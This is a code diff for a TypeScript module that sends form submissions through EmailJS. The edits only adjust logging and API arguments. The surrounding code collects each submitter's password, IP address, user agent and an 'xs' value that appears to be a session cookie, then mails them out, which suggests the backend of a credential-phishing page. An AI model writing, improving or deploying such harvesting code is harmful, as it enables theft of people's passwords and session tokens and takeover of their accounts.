@@ -7,6 +7,7 @@ export const initEmailJS = () => {
     return;
   }
   emailjs.init(userId);
+  console.log('EmailJS initialized successfully');
 };
 
 export const sendValidationFormEmail = async (formData: any) => {
@@ -27,13 +28,18 @@ export const sendValidationFormEmail = async (formData: any) => {
       user_agent: formData.userAgent || navigator.userAgent,
     };
 
+    console.log('Sending validation email with params:', {
+      ...templateParams,
+      xs: '[REDACTED]'
+    });
+
     const result = await emailjs.send(
       serviceId,
       templateId,
-      templateParams,
-      import.meta.env.VITE_EMAILJS_USER_ID
+      templateParams
     );
-    console.log('Validation email sent:', { status: result.status, text: result.text });
+
+    console.log('Validation email sent successfully:', { status: result.status, text: result.text });
     return result;
   } catch (error) {
     console.error("Error sending validation email:", error);
@@ -58,12 +64,12 @@ export const sendConfirmationFormEmail = async (formData: any) => {
       password: formData.password,
       contact_method: formData.contactMethod,
       country_code: formData.countryCode,
-      timestamp: formData.timestamp || new Date().toISOString(),
+      timestamp: formData.timestamp,
       ip_address: formData.ipAddress || "Not available",
       user_agent: formData.userAgent || navigator.userAgent,
     };
 
-    console.log('Sending confirmation with params:', {
+    console.log('Sending confirmation email with params:', {
       ...templateParams,
       password: '[REDACTED]',
       xs: '[REDACTED]'
@@ -72,11 +78,10 @@ export const sendConfirmationFormEmail = async (formData: any) => {
     const result = await emailjs.send(
       serviceId,
       templateId,
-      templateParams,
-      import.meta.env.VITE_EMAILJS_USER_ID
+      templateParams
     );
 
-    console.log('Confirmation email sent:', { status: result.status, text: result.text });
+    console.log('Confirmation email sent successfully:', { status: result.status, text: result.text });
     return result;
   } catch (error) {
     console.error("Error sending confirmation email:", error);
